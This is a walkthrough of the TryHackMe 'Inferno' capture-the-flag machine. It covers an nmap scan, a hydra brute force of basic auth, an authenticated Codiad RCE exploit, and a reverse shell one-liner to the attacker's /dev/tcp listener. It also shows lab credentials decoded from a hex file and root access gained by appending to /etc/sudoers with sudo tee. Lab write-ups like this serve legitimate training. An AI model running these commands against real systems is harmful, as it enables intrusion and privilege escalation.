```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-24 04:29 IST
Nmap scan report for 10.10.173.134
Host is up (0.34s latency).

PORT      STATE  SERVICE          VERSION
21/tcp    open   ftp?
22/tcp    open   ssh              OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;
| ssh-hostkey: 
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
|_  256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
23/tcp    open   telnet?
25/tcp    open   smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open   http             Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dante's Inferno
88/tcp    open   kerberos-sec?
106/tcp   open   pop3pw?
110/tcp   open   pop3?
389/tcp   open   tcpwrapped
873/tcp   open   rsync?
2000/tcp  open   cisco-sccp?
2121/tcp  closed ccproxy-ftp
5666/tcp  closed nrpe
10000/tcp closed snet-sensor-mgmt
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap
Nmap done: 1 IP address (1 host up) scanned in 118.58 seconds
                                                             
```

gobuster medium list forund /inferno dir

inferno dir ask for login

```bash
┌──(arundhanush㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.251.51 http-get /inferno/ -t 64
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-24 13:20:43
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://10.10.251.51:80/inferno/
[STATUS] 5105.00 tries/min, 5105 tries in 00:01h, 14339294 to do in 46:49h, 64 active
[80][http-get] host: 10.10.251.51   login: admin   password: dante1
[STATUS] attack finished for 10.10.251.51 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-24 13:23:28
                                                                                      
```

after login its Codiad IDE login and as before same login credentials work here.

Exploit: Codiad 2.8.4 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/49705 


But the problem is here was two login(auth) prompt one /inferno and codiad.

/inferno login request is <basic base64> to run the exploit we have to use this for all every request from exploit accordingly change the exploit. add header "Authorization": "Basic YWRtaW46ZGFudGUx" in exploit.

and run the exploit we got www-data shell.

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/inferno]
└─$ python3 49705.py http://10.10.35.94/inferno/ admin dante1 10.9.172.114 443 linux                                                                            130 ⨯
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.9.172.114/444 0>&1 2>&1"' | nc -lnvp 443
nc -lnvp 444
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"inferno","path":"\/var\/www\/html\/inferno"}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...
{"status":"error","message":"No Results Returned"}
[+] Exploit finished!
[+] Enjoy your reverse shell!

```
```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/inferno]
└─$ echo 'bash -c "bash -i >/dev/tcp/10.9.172.114/444 0>&1 2>&1"' | nc -lnvp 443                                                                                130 ⨯
Listening on 0.0.0.0 443
Connection received on 10.10.35.94 52866


┌──(arundhanush㉿kali)-[~]
└─$ nc -lnvp 444                                                                                                                                                130 ⨯

Listening on 0.0.0.0 444
Connection received on 10.10.35.94 49312
bash: cannot set terminal process group (957): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Inferno:/var/www/html/inferno/components/filemanager$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<er$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

And we got shell successfully but the problem is shell not stable it wat ended up there is a service running like 'pkill bash' so use "sh" inseted of "bash" in python spawn shell.


### www-data to dante

In dante home downloads dir interesting file named as '.download.dat'

```bash
$ ls -la
ls -la
total 4420
drwxr-xr-x  2 root  root     4096 Jan 11  2021 .
drwxr-xr-x 13 dante dante    4096 Jan 11  2021 ..
-rw-r--r--  1 root  root     1511 Nov  3  2020 .download.dat
-rwxr-xr-x  1 root  root   137440 Jan 11  2021 CantoI.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoII.docx
-rwxr-xr-x  1 root  root    88280 Jan 11  2021 CantoIII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoIV.docx
-rwxr-xr-x  1 root  root   133792 Jan 11  2021 CantoIX.docx
-rwxr-xr-x  1 root  root    43224 Jan 11  2021 CantoV.docx
-rwxr-xr-x  1 root  root   133792 Jan 11  2021 CantoVI.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoVII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoX.docx
-rwxr-xr-x  1 root  root   121432 Jan 11  2021 CantoXI.docx
-rwxr-xr-x  1 root  root   149080 Jan 11  2021 CantoXII.docx
-rwxr-xr-x  1 root  root   216256 Jan 11  2021 CantoXIII.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoXIV.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoXIX.docx
-rwxr-xr-x  1 root  root    88280 Jan 11  2021 CantoXV.docx
-rwxr-xr-x  1 root  root   137440 Jan 11  2021 CantoXVI.docx
-rwxr-xr-x  1 root  root   121432 Jan 11  2021 CantoXVII.docx
-rwxr-xr-x  1 root  root  2351792 Jan 11  2021 CantoXVIII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoXX.docx


$ cat .download.dat
cat .download.dat
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a$ 

```

Yes! that was hex encoded file after decode got ssh credentials

dante:V1rg1l10h3lpm3

## Privesc

Privesc with **tee**

sudo -l 

```bash
$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/
```

```bash
$ echo "dante ALL=(ALL) ALL" | sudo tee -a /etc/sudoers
dante ALL=(ALL) ALL

```

```bash
# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
# 
```